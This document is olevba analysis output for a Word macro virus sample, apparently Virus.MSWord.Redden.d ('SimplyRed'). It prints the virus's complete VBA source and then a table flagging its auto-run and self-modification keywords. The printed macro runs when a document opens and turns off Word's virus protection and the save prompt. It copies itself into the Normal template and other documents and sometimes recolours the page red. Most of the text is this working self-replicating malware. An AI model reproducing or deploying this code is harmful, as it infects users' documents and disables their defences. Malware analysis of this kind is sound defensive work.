olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden.d-0de66aa7143c8a8642e6376c354f240d0a9a8fb1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden.d-0de66aa7143c8a8642e6376c354f240d0a9a8fb1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()

'AVP ------- *SUX* Go fU(k yourself Kaspersky!
'SimplyRed is tRuNcEd but it's ALIVE
'|mm0R†aL VIRii
'SimplyRed by N|(0†|N 2000

On Error GoTo Phuck
If Int(Rnd * 50) = 9 Then
    ActiveDocument.Background.Fill.ForeColor.RGB = RGB(255, 0, 0)
    ActiveDocument.Background.Fill.Visible = msoTrue
    ActiveDocument.Background.Fill.Solid
    ActiveWindow.View.Type = wdOnlineView
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set stlth = ActiveDocument.VBProject
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
Set stlth = NormalTemplate.VBProject
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
cnt = stlth.VBComponents.Count
If cnt <> 0 Then
For i = 1 To cnt
aprj = stlth.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
Else
already = False
End If
If Not already Then
stlth.VBComponents.Add (vbext_ct_StdModule)
stlth.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
End If
Phuck:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
